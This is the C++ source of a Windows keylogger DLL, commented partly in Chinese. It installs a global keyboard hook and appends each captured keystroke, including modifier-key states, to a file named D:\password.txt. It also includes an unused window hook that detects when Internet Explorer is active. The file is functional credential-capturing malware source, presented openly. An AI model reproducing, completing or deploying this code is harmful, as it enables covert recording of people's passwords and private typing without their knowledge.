// KDLL.cpp : 定义 DLL 应用程序的导出函数。
//
#include "stdafx.h"
#include "KDLL.h"

#define	CHARNUM		5
#define	TXTLENGTH	10
#define	LOGDIR	"D:\\password.txt"

extern HINSTANCE hInst;
static	BOOL	bHooked = FALSE;
static	BOOL	isActived = FALSE;
static	HHOOK	hKBHook = 0, hhookMsg = 0;

int count;
static char	tomb[CHARNUM];
static FILE *stream;
static int shift = 32;
short  flag;

enum NUM	//枚举几个特殊功能键
{
	SHIFT,
	CONTROL,
	ALT,
	CAPITAL
};


static int	condition[CHARNUM][CAPITAL + 1];
static TCHAR text[TXTLENGTH];



LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam);

// 这是导出变量的一个示例
int nKDLL=0;



// 这是导出函数的一个示例。
INT _stdcall fnAdd(int a, int b)
{
	return  a + b;
}






void _stdcall fnSetKbHook(void)
{
	if (!bHooked)
	{	
		// KeyBoard 的 钩子
		if (!(hKBHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, (DWORD)NULL)))
		{
			wprintf(L"hook KB FAILED!");
			MessageBox(NULL, L"Failed to install KB hook!", L"Error", MB_ICONERROR);
			return;
		}

		//// 窗口操作的钩子 最大化 最小化 关闭等
		//if (!(hhookMsg = SetWindowsHookEx(WH_CBT, (HOOKPROC)CBTProc, hInst, (DWORD)NULL)))
		//{
		//	printf("hook CBT FAILED!");
		//	MessageBox(NULL, L"Failed to install  CBT hook!", L"Error", MB_ICONERROR);
		//	return;
		//}


		bHooked = TRUE; //设置标志位
		
		MessageBox(GetDesktopWindow(), L"HOOKED!", L"info", MB_OK);
	}
}

void _stdcall fnRemoveKbHook(void)
{
	if (bHooked)
	{
		if (UnhookWindowsHookEx(hKBHook))
		{
			MessageBox(GetDesktopWindow(), L"UNHOOKED!", L"info", MB_OK);
		}
	}
	else
	{
		MessageBox(GetDesktopWindow(), L"UNHOOKED!", L"info", MB_ICONERROR);
	}
}
// log 回写函数
void syncLog()
{
	if (0 > (stream = fopen(LOGDIR, "a+")))
	{
		MessageBox(GetDesktopWindow(), L"File Open FAILED!", L"warning", MB_ICONERROR);
	}
	//else
	//{
	//	MessageBox(GetDesktopWindow(), L"syncED!", L"warning", MB_ICONERROR);
	//}
	for (int i = 0; i < count; i++)
	{
		switch (tomb[i])
		{
		case VK_DELETE:
			fprintf(stream, "%s", "<d>");
			break;

		case VK_RETURN:
			fprintf(stream, "%s", "\n");
			break;

		case VK_BACK:
			fprintf(stream, "%s", "<b>");
			break;

		case VK_SHIFT:
			if (condition[i][SHIFT] == 1)
				fprintf(stream, "%s", "<sd>");
			else
				fprintf(stream, "%s", "<su>");
			break;

		case VK_CONTROL:
			if (condition[i][CONTROL] == 1)
				fprintf(stream, "%s", "<ctd>");
			else
				fprintf(stream, "%s", "<ctu>");
			break;

		case VK_MENU:
			if (condition[i][ALT] == 1)
				fprintf(stream, "%s", "<ad>");
			else
				fprintf(stream, "%s", "<au>");
			break;

		case VK_CAPITAL:
			if (condition[i][CAPITAL] == 1)
				fprintf(stream, "%s", "<cpd>");
			else
				fprintf(stream, "%s", "<cpu>");
			break;

		default:
			fprintf(stream, "%c", tomb[i]);
			break;
		}
	}
	fclose(stream);
}

//键盘消息处理的回调函数
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) 
{

	int temp;
	int flag_shift;
	int flag_capital;
	int flag_alt;
	int flag_control;

	if (code >= 0) //确保消息正确
	{
		// 判断是否为特殊键
		if ((wParam == VK_SHIFT) || (wParam == VK_CAPITAL) || (wParam == VK_MENU) || (wParam == VK_CONTROL))
		{
			flag_shift = 0x8000 & GetKeyState(VK_SHIFT);
			flag_capital = 0x0001 & GetKeyState(VK_CAPITAL);
			flag_alt = 0x8000 & GetKeyState(VK_MENU);
			flag_control = 0x8000 & GetKeyState(VK_CONTROL);
		}

	
		// 判断F*
		if (wParam != VK_TAB && wParam != VK_ESCAPE && wParam != VK_LEFT && wParam != VK_RIGHT &&
			wParam != VK_UP && wParam != VK_DOWN && wParam != VK_END && wParam != VK_HOME &&
			wParam != VK_PRIOR && wParam != VK_NEXT && wParam != VK_INSERT && wParam != VK_NUMLOCK &&
			wParam != VK_SCROLL && wParam != VK_PAUSE && wParam != VK_LWIN && wParam != VK_RWIN &&
			wParam != VK_F1 && wParam != VK_F2 && wParam != VK_F3 && wParam != VK_F4 && wParam != VK_F5 &&
			wParam != VK_F6 && wParam != VK_F7 && wParam != VK_F8 && wParam != VK_F9 &&wParam != VK_F10 &&
			wParam != VK_F11 && wParam != VK_F12)
		{
			if ((0x80000000 & lParam) == 0)	//WM_KEYDOWN?
			{
				if (wParam >= 0x41 && wParam <= 0x5a)
					wParam += 32;					 //Kisbeture konvertalas
				if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU || wParam == VK_CAPITAL)
				{
					if (wParam == VK_CAPITAL)
						temp = 1;
					else temp = 0;
					condition[count][wParam - 16 - temp] = 1;
				}
				tomb[count] = wParam;
				count++;
			}
			else								//WM_KEYUP?
				if (wParam == VK_SHIFT || wParam == VK_CONTROL || wParam == VK_MENU || wParam == VK_CAPITAL)
				{
					if (wParam == VK_CAPITAL)
						temp = 1;
					else temp = 0;
					condition[count][wParam - 16 - temp] = 2;
					tomb[count] = wParam;
					count++;
				}
			if (count == CHARNUM)
			{
				syncLog();
				count = 0;
				initCondition();
			}
		}
	}
	//MessageBoxA(GetDesktopWindow(), "get", "info", NULL);
	return CallNextHookEx(hKBHook, code, wParam, lParam); //要把消息传到下一个钩子 ，不然键盘就没用了！
}


void initCondition(void)
{
	int i, j;
	for (i = 0; i < CHARNUM; i++)
		for (j = 0; j < CAPITAL + 1; j++)
			condition[i][j] = 0;
}

LRESULT CALLBACK CBTProc(int code, WPARAM wParam, LPARAM lParam) //窗口检测的钩子函数 
{
	/*目的实现检测指定窗口，在窗口名获取有点小问题*/
	char textA[TXTLENGTH];

	if (code == HCBT_ACTIVATE)	// HCBT_ACTIVATE 系统自带的状态码
	{
		GetClassName((HWND)wParam, text, TXTLENGTH);
		GetWindowTextA((HWND)wParam, textA, TXTLENGTH);

		if (text[0] == 'I' && text[1] == 'E')	//Class name of Internet-Explorer begins with IE
			isActived = TRUE;
		else
			isActived = FALSE;
	
		if (0 != strncmp(textA, "info", 4))
		{
			MessageBoxA(NULL, textA, "info", NULL);
		}
		

		//MessageBox(GetDesktopWindow(), text, L"info", NULL);
	}

	return CallNextHookEx(hhookMsg, code, wParam, lParam); //传递消息 否则无法关闭窗口
}
